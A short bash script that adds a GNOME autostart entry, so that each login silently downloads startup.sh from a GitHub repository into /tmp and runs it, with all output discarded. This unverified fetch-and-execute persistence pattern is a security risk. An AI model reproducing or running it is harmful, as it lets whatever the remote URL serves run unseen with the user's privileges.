#!/bin/bash

mkdir -p "$HOME/.config/autostart" > /dev/null 2>&1

# write desktop entry with full path to sza.sh
cat > "$HOME/.config/autostart/sza.desktop" <<EOF
[Desktop Entry]
Type=Application
Exec=$HOME/sza.sh
Hidden=false
Terminal=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=sza
Comment=sza
EOF

chmod +x "$HOME/.config/autostart/sza.desktop" > /dev/null 2>&1

# write launcher script that downloads and runs latest startup.sh
cat > "$HOME/sza.sh" <<EOF
#!/bin/bash
curl "https://raw.githubusercontent.com/aryanbaburajan/sza/refs/heads/main/startup.sh" -o "/tmp/sza-script.sh" > /dev/null 2>&1
chmod +x /tmp/sza-script.sh
exec "/tmp/sza-script.sh" > /dev/null 2>&1
EOF

chmod +x "$HOME/sza.sh" > /dev/null 2>&1
